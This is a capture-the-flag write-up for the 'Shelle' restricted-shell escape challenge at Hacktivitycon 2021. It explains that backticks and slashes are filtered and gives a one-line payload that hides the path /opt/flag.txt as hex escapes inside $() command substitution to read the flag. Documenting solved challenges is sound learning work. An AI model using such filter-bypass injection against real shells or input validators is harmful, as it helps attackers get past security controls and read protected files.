---
layout: load_md
title: The White Circle | Hacktivitycon 2021 | Shelle Writeup
desc: Check out our writeup for Shelle for Hacktivitycon 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Hacktivitycon 2021
parent: hacktivitycon_2021
category: misc
challenge: Shelle
tags: "misc, nigamelastic, bash, jail, escape"
date: 2021-09-20T00:00:00+00:00
last_modified_at: 2021-09-20T00:00:00+00:00
---


> Solved by : nigamelastic 

on starting the shell u see that u can only use the 7 commands
`cat`, `ls`, `pwd`, `whoami`, `ps`, `id`, `echo`
as mentioned in the txt file present


    Dear Students, here are the questions for your next assignment, please finish them..
    If you don't wanna do the assignment you can simply submit the flag which is in the /opt directory, but hah that would be impawsible
    
    1) What is Linux?
    2) What is the difference between UNIX and LINUX?
    3) What is BASH?
    4) What is Linux Kernel?
    5) What is LILO?
    6) What is a swap space?
    7) What is the advantage of open source?
    8 ) What are the basic components of Linux?
    9) Does it help for a Linux system to have multiple desktop environments installed?
    10) What is the basic difference between BASH and DOS?
    
    
    Also do learn about following linux commands.
    > whoami - Prints the user name associated with the current effective user ID.
    > pwd - Prints the name of current working directory
    > ls - List information about the FILEs (the current directory by default)
    > ps - Displays information about a selection of the active processes.
    > id - Print user and group information for the specified USER, or (when USER omitted) for the current user.
    > echo - display a line of text (sometimes useful to print emotes)
    > cat - concatenate files and print on the standard output
    

most of the 
using the research from the previous integrity challenge I tried using a hex decoding via
`echo -e` however everything including``(backticks)` and `/` are filtered.
luckily `$()` isn’t so i crafted the payload and got the flag:


    cat $(echo -e "\x2f\x6f\x70\x74\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74") 
    flag{82ad133488ad326eaf2120e03253e5d7}